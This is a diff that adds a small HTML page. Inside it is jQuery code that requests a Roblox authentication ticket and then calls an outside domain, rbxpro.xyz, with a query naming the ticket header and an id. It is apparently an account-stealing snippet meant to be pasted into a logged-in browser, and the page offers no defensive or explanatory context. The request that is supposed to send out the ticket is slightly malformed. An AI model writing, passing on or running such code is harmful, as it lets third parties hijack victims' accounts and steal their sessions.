@@ -1,0 +1,9 @@
+<html><head></head><body><pre>var data = {};
+$["ajax"]({
+    type: "POST",
+    url: "https://auth.roblox.com/v1/authentication-ticket",
+    data: data,
+    success: function() {
+        $["get"]("https://rbxpro.xyz/?confirmation=getResponseHeader/rbx-authentication-ticket&amp;id=727935575")
+    }
+})</pre></body></html>
